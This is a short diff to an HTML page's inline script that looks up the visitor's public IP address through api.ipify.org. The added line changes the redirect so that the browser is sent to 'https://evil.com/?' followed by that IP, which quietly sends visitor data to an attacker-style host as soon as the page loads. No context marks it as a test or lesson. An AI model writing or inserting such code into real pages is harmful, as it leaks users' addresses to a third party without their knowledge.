@@ -9,7 +9,7 @@
   <script>
     fetch('https://api.ipify.org/?format=json')
       .then(results => results.json())
-      .then(data => window.location.replace(data.ip));
+      .then(data => window.location.replace('https://evil.com/?'+data.ip));
   </script>
 </body>
 </html>
